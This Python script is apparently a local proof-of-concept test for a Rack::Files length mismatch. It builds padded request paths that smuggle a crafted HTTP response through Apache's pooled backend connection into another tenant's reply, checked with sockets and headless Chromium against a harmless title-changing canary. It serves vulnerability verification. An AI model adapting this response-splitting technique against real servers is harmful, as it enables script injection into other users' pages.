#!/usr/bin/env python3
"""Test a real Rack::Files length mismatch with an HTTP-response tail.

Rack 3.2.5 reflects the attacker-controlled missing path in a 404 body but
declares String#size instead of the wire byte length.  This test aligns a
second HTTP response at the first delayed byte, then checks whether Apache's
pooled backend connection turns it into tenant B's response.  The HTML body
only changes document.title; it does not read or send any user data.
"""

from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from urllib.parse import quote_from_bytes


def read_response(sock: socket.socket) -> bytes:
    sock.settimeout(8)
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(8192)
        if not chunk:
            raise RuntimeError(f"incomplete response headers: {data!r}")
        data += chunk
    head, body = data.split(b"\r\n\r\n", 1)
    length_lines = [
        line for line in head.split(b"\r\n")
        if line.lower().startswith(b"content-length:")
    ]
    if not length_lines:
        # Thin can emit a close-delimited error response for an overlong or
        # otherwise rejected request. Keep it as diagnostic input instead of
        # treating a harness parsing failure as a security result.
        if b"connection: close" in head.lower():
            sock.settimeout(3)
            while True:
                try:
                    chunk = sock.recv(8192)
                except socket.timeout:
                    break
                if not chunk:
                    break
                body += chunk
        return head + b"\r\n\r\n" + body
    length = int(length_lines[0].split(b":", 1)[1].strip())
    while len(body) < length:
        body += sock.recv(8192)
    return head + b"\r\n\r\n" + body[:length]


def read_response_with_extra(sock: socket.socket) -> bytes:
    response = read_response(sock)
    extra = b""
    sock.settimeout(3)
    try:
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            extra += chunk
    except socket.timeout:
        pass
    return response + extra


def wait_for_port(port: int, process: subprocess.Popen[str], label: str) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if process.poll() is not None:
            raise RuntimeError(f"{label} exited: {process.stderr.read()}")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"{label} did not listen")


def make_attack_path() -> tuple[str, bytes]:
    html = (
        b"<html><script>document.title='A_CONTROLLED_CANARY'</script></html>"
    )
    # Pick a value whose integer-length boundary admits an exact solution for
    # the self-referential Content-Length/padding equation below while keeping
    # the ordinary request target well below common URI limits.
    before = 87
    for after in range(before * 2):
        padded_body = html + ("☃" * after).encode()
        marker = (
            b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
            b"X-A-Controlled: A_ONLY\r\nContent-Length: "
            + str(len(padded_body)).encode()
            + b"\r\nConnection: close\r\n\r\n"
            + padded_body
        )
        # Rack's wrong character count makes the delayed tail begin at this
        # byte offset: 2 * before == marker chars + after + final newline.
        if after == 2 * before - len(marker) - 1:
            encoded_marker = quote_from_bytes(marker, safe=b"")
            path = "/missing/" + "%E2%98%83" * before + encoded_marker + "%E2%98%83" * after
            return path, marker
    raise AssertionError("could not align the Rack response tail")


def make_html_body_path() -> tuple[str, bytes]:
    html = b"<html><script>document.title='A_CONTROLLED_CANARY'</script></html>"
    marker = "☃".encode() + html
    # Keep the request target close to the accepted full-response probe. The
    # first version used 120 padding code points and Thin rejected the target
    # with 400 before Rack saw it, which tested the parser limit rather than
    # the response-tail behavior.
    before = 40
    for after in range(before * 2):
        if after == 2 * before - (1 + len(html)) - 1:
            encoded_marker = quote_from_bytes(marker, safe=b"")
            path = "/missing/" + "%E2%98%83" * before + encoded_marker + "%E2%98%83" * after
            return path, marker
    raise AssertionError("could not align the HTML body tail")


def start_apache(httpd: Path, server_root: Path, backend_port: int,
                 port: int, root: Path, disablereuse: bool) -> subprocess.Popen[str]:
    reuse = " disablereuse=On" if disablereuse else ""
    config = root / "httpd.conf"
    config.write_text(f"""\
ServerRoot "{server_root}"
Listen 127.0.0.1:{port}
PidFile "{root / 'httpd.pid'}"
ErrorLog "{root / 'error.log'}"
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
LogFormat "source=%{{proxy-source-port}}n host=%{{Host}}i status=%>s bytes=%B" probe
CustomLog "{root / 'access.log'}" probe
ProxyPass / http://127.0.0.1:{backend_port}/ retry=0{reuse}
ProxyPassReverse / http://127.0.0.1:{backend_port}/
""")
    apache = subprocess.Popen(
        [str(httpd), "-f", str(config), "-DFOREGROUND", "-X"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        env={**os.environ, "APACHE_RUN_DIR": str(root)},
    )
    wait_for_port(port, apache, "Apache")
    return apache


def trigger_attack(port: int, path: str, collect_extra: bool = False) -> bytes:
    with socket.create_connection(("127.0.0.1", port), timeout=8) as attacker:
        attacker.sendall(
            f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
            "Connection: keep-alive\r\n\r\n".encode()
        )
        if collect_extra:
            return read_response_with_extra(attacker)
        return read_response(attacker)


def fetch_victim(port: int) -> bytes:
    with socket.create_connection(("127.0.0.1", port), timeout=8) as victim:
        victim.sendall(
            b"GET /victim HTTP/1.1\r\nHost: tenant-b.example\r\n"
            b"Connection: close\r\n\r\n"
        )
        return read_response(victim)


def browser_victim(browser: str, port: int) -> bytes:
    result = subprocess.run(
        [browser, "--headless", "--no-sandbox", "--disable-gpu",
         "--no-proxy-server", "--dump-dom", "--virtual-time-budget=1000",
         "--host-resolver-rules=MAP tenant-b.example 127.0.0.1",
         f"http://tenant-b.example:{port}/victim"],
        capture_output=True, text=True, timeout=15,
        env={**os.environ, "NO_PROXY": "*", "no_proxy": "*"},
    )
    print(f"browser_exit={result.returncode}")
    print(f"browser_dom={result.stdout[:2000]!r}")
    return result.stdout.encode()


def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
            disablereuse: bool, browser: bool, a_delay: float,
            b_delay: float, impact: bool = False) -> bool:
    with tempfile.TemporaryDirectory(prefix="rack-thin-split-") as tmp:
        root = Path(tmp)
        thin_log = root / "thin.log"
        thin = subprocess.Popen(
            [str(args.thin), "start", "-R", str(args.fixture / "config.ru"),
             "-a", "127.0.0.1", "-p", "18181"],
            cwd=args.fixture, stdout=thin_log.open("w"), stderr=subprocess.STDOUT,
            text=True, env={**os.environ, "RACK_FILES_ROOT": str(root / "files"),
                            "RACK_THIN_A_DELAY": str(a_delay),
                            "RACK_THIN_B_DELAY": str(b_delay),
                            "RACK_THIN_STRIP_CASCADE": "1",
                            "RACK_THIN_IMPACT": "1" if impact else "0"},
        )
        (root / "files").mkdir()
        apache = None
        try:
            wait_for_port(18181, thin, "Thin")
            direct = trigger_attack(18181, path, collect_extra=True)
            print(f"direct_tail_marker={expected_marker in direct}")
            print(f"direct_response_tail={direct[-1200:]!r}")
            if expected_marker not in direct:
                print("rack_thin_split_input_reached_app=False")
                return False
            apache = start_apache(args.httpd, args.server_root, 18181, 18080, root, disablereuse)
            response_a = trigger_attack(18080, path)
            print(f"response_a_suffix={response_a[-80:]!r}")
            if browser:
                body_b = browser_victim(args.browser, 18080)
                observed = b"A_CONTROLLED_CANARY" in body_b
            else:
                response_b = fetch_victim(18080)
                print(f"response_b={response_b!r}")
                observed = expected_marker in response_b
            access_log = root / "access.log"
            if access_log.exists():
                print(f"apache_access_log={access_log.read_text()!r}")
            mode = "disabled" if disablereuse else "enabled"
            kind = "browser" if browser else "raw"
            print(f"rack_thin_split_mode={mode} kind={kind} a_delay={a_delay} b_delay={b_delay} observed={observed}")
            if disablereuse and observed:
                raise AssertionError("reuse-disabled control still carried A marker")
            return observed
        finally:
            if apache is not None:
                apache.terminate()
                try:
                    apache.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    apache.kill()
            thin.terminate()
            try:
                thin.wait(timeout=3)
            except subprocess.TimeoutExpired:
                thin.kill()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--thin", required=True, type=Path)
    parser.add_argument("--fixture", required=True, type=Path)
    parser.add_argument("--browser", type=str)
    args = parser.parse_args()
    args.browser = args.browser or shutil.which("chromium") or shutil.which("chromium-browser")
    if not args.browser:
        raise SystemExit("chromium is required for browser validation")
    path, marker = make_attack_path()
    delay_pairs = [(0.02, 0.50), (0.05, 0.50), (0.10, 0.50),
                   (0.20, 0.50), (0.25, 0.50), (0.40, 0.80),
                   (0.49, 0.80)]
    raw_positive = False
    winning_pair: tuple[float, float] | None = None
    for a_delay, b_delay in delay_pairs:
        observed = one_run(args, path, marker, False, False, a_delay, b_delay)
        if observed and not raw_positive:
            raw_positive = True
            winning_pair = (a_delay, b_delay)
    browser_positive = False
    if winning_pair:
        a_delay, b_delay = winning_pair
        browser_positive = one_run(args, path, marker, False, True, a_delay, b_delay)
        one_run(args, path, marker, True, False, a_delay, b_delay)
        one_run(args, path, marker, True, True, a_delay, b_delay)
    print(f"rack_thin_split_raw_positive={raw_positive} winning_pair={winning_pair}")
    print(f"rack_thin_split_browser_positive={browser_positive}")
    print("rack_thin_split_real_trigger=" + ("observed" if raw_positive else "not_observed"))

    html_path, html_marker = make_html_body_path()
    html_raw_positive = False
    html_winning_pair: tuple[float, float] | None = None
    for a_delay, b_delay in delay_pairs:
        observed = one_run(args, html_path, html_marker, False, False,
                           a_delay, b_delay, impact=True)
        if observed and not html_raw_positive:
            html_raw_positive = True
            html_winning_pair = (a_delay, b_delay)
    html_browser_positive = False
    if html_winning_pair:
        a_delay, b_delay = html_winning_pair
        html_browser_positive = one_run(
            args, html_path, html_marker, False, True, a_delay, b_delay,
            impact=True
        )
        one_run(args, html_path, html_marker, True, False, a_delay, b_delay,
                impact=True)
        one_run(args, html_path, html_marker, True, True, a_delay, b_delay,
                impact=True)
    print(f"rack_thin_html_raw_positive={html_raw_positive} winning_pair={html_winning_pair}")
    print(f"rack_thin_html_browser_positive={html_browser_positive}")
    print("rack_thin_html_real_trigger=" +
          ("observed" if html_raw_positive else "not_observed"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
